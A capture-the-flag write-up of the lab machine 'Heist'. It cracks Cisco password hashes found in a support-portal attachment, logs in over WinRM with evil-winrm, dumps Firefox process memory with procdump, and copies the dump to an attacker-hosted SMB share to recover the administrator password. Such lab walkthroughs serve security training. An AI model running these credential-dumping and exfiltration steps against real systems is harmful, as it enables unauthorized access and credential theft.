---
title: Heist
date: 2026-08-19
description: Easy Windows machine leaking Cisco IOS password hashes from a support portal attachment — cracking them to reach WinRM, then pulling administrator credentials out of a Firefox process dump.
tags:
  - htb
  - Easy
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Wed Aug 19 08:38:31 2026 as: /usr/lib/nmap/nmap -p80,135,445,5985,49669 -A -oN scan_results.txt 10.129.96.157
Nmap scan report for heist.htb (10.129.96.157)
Host is up (0.45s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Support Login Page
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (96%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (96%), Microsoft Windows 10 1903 - 21H1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-08-18T12:43:43
|_  start_date: N/A
|_clock-skew: -23h56m19s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   469.37 ms 10.10.16.1
2   471.35 ms heist.htb (10.129.96.157)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 19 08:40:42 2026 -- 1 IP address (1 host up) scanned in 130.78 seconds

```

Guest login on the support portal, then the attachment page hands over `config.txt`. It's a Cisco router config — and Cisco hashes come in two flavors:

- type 5 => md5crypt
- type 7 => Vigenère cipher

Online crackers for both:

> https://www.ifm.net.nz/cookbooks/passwordcracker.html

> https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html

```
secert $1$pdQG$o8nrSzsGXeaduXrjlvKc91 => stealth1agent

rout3r 0242114B0E143F015F5D1E161713 => $uperP@ssword
admin  02375012182C1A1D751618034F36415408 => Q4)sJu\Y8qz*A3?d
```

# User

> `hazard - stealth1agent`

SMB with those creds enumerates users — no share worth reading though:

```sh
SMB         10.129.96.157   445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)

```

The admin password from the config happens to belong to Chase — WinRM opens for him:

> `Chase - Q4)sJu\Y8qz*A3?d`

```sh
evil-winrm -i 10.129.96.157 -u 'SupportDesk\chase' -p 'Q4)sJu\Y8qz*A3?d'
```

# Root

`todo.txt` on the desktop:

```powershell
*Evil-WinRM* PS C:\Users\Chase\Desktop> cat todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```

Check the running processes to see how the administrator checks that issues list:

```powershell
*Evil-WinRM* PS C:\Users\Chase\Desktop> get-process
```

Alternatively, if you want to specify a specific process name:

```powershell
*Evil-WinRM* PS C:\Users\Chase\Desktop> get-process -name firefox
```

### procdump

Dump it with **procdump.exe**:

> Download link : https://learn.microsoft.com/en-us/sysinternals/downloads/procdump

Upload the exe, then:

```syntax
./procdump.exe -ma <PID> -o <outpufile>
```

```powershell
*Evil-WinRM* PS C:\Users\Chase\Desktop> ./procdump.exe -ma 4152 -o firefox.dmp
```

## smbserver

Transfer files with smbserver — evil-winrm's download option crawls on big files. Create a directory called test and start hosting the smbserver:

```sh
impacket-smbserver -smb2support -user test -password test test 'test'
```

Mount the share to a local drive:

```powershell
*Evil-WinRM* PS C:\Users\Chase\Documents> net use z: \\10.10.16.82\test /user:test test 

The command completed successfully. 
```

`z:` is the drive name that the share connected to (can give random letters).

---
Note:
- To check the newly connected entries (connected drive list):

```powershell
*Evil-WinRM* PS C:\Users\Chase\Documents> net use
```

- To disconnect the drive:

```powershell
*Evil-WinRM* PS C:\Users\Chase\Documents> net use z: /delete
```
---

Once connected:

```powershell
*Evil-WinRM* PS C:\Users\Chase\Documents> copy firefox.dmp z:\
```

To examine: run `strings` over the .dmp, hunting for **password**:

```sh
strings firefox.dmp | less
```

Why would it be in there? It holds the login request made, the application stores credentials in memory without encryption, and when a process dump is created, it captures everything in RAM at that moment.

```sh
evil-winrm -i 10.129.96.157 -u 'SupportDesk\Administrator' -p '4dD!5}x/re8]FBuZ'
```

Gained `root`
